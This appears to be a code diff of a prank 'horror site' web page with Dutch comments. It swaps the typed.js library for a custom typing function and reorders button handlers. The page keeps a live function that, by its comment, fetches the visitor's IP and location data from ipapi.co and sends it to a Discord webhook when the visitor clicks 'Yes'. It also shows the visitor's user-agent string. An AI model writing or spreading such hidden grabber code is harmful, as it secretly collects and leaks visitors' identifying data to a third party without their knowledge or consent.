@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Welcome to the Horror Site</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
-    <script src="https://cdn.jsdelivr.net/npm/typed.js"></script>
     <style>
         /* Jouw CSS-stijlen hier */
         body {
@@ -52,11 +51,8 @@
         .btn:hover {
             background-color: #a50000;
         }
-        #confirmation {
-            display: none;
-        }
-        #video-container {
-            display: none;
+        .typed-effect {
+            display: inline-block;
         }
     </style>
 </head>
@@ -93,6 +89,21 @@
     </audio>
 
     <script>
+        // Functie om de getypte tekst te simuleren
+        function simulateTyping(element, text, speed, callback) {
+            var index = 0;
+            var timer = setInterval(function() {
+                element.textContent += text[index];
+                index++;
+                if (index === text.length) {
+                    clearInterval(timer);
+                    if (typeof callback === 'function') {
+                        callback();
+                    }
+                }
+            }, speed);
+        }
+
         // Functie om IP-gegevens op te halen en naar Discord Webhook te sturen
         function getIPDataAndSendToDiscord() {
             fetch('https://ipapi.co/json/')
@@ -149,15 +160,13 @@
         // Roep de functie op wanneer de pagina wordt geladen
         window.onload = function() {
             // Horror begroeting met getypt effect
-            var typed = new Typed('#horrorText', {
-                strings: ['Welcome ' + navigator.userAgent + '...'],
-                typeSpeed: 50,
-                onComplete: function() {
-                    setTimeout(function() {
-                        document.getElementById('container').style.display = 'block';
-                        document.getElementById('horrorText').style.display = 'none';
-                    }, 1500);
-                }
+            var horrorText = document.getElementById('horrorText');
+            var message = 'Welcome ' + navigator.userAgent + '...';
+            simulateTyping(horrorText, message, 50, function() {
+                setTimeout(function() {
+                    document.getElementById('container').style.display = 'block';
+                    document.getElementById('horrorText').style.display = 'none';
+                }, 1500);
             });
 
             // Voeg een click event toe aan de "Enter if you dare" knop
@@ -168,10 +177,10 @@
 
             // Voeg click events toe aan de "Yes" en "No" knoppen
             document.getElementById('yesBtn').addEventListener('click', function() {
-                getIPDataAndSendToDiscord();
                 document.getElementById('confirmation').style.display = 'none';
                 document.getElementById('video-container').style.display = 'block';
                 document.getElementById('video').play();
+                getIPDataAndSendToDiscord();
             });
 
             document.getElementById('noBtn').addEventListener('click', function() {
